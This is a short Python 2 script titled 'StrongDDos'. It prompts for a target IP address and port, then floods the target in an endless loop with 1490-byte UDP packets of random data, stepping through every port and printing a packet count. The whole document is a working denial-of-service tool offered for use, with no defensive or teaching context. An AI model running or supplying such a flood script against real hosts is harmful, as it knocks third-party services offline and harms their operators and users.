import sys, os, time, socket, random
from datetime import datetime
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
os.system("figlet StrongDDos")
print("---------------------")
print ("| Author: qntrnt |")
print("---------------------")
print
ip = raw_input("IP Adress : ")
port = input("Port : ")
os.system("clear")
os.system("figlet Attack Starting")
time.sleep(0.1)
sent = 0
try:
    while True:
         sock.sendto(bytes, (ip,port))
         sent = sent + 1
         port = port + 1
         print ("Sended %s packets to %s to port:%s"%(sent,ip,port))
         if port == 65534:
           port = 1
except KeyboardInterrupt:
    os.system("figlet DDos Attack Stoped !")
    exit()
